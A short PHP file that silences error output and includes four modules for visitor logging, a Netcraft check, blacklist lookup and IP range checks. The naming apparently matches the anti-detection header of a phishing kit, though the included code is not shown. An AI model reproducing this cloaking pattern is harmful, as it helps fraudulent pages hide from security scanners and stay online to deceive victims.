<?php
error_reporting(0);
ini_set('display_errors', 0);
require "includes/visitor_log.php";
require "includes/netcraft_check.php";
require "includes/blacklist_lookup.php";
require "includes/ip_range_check.php";
?>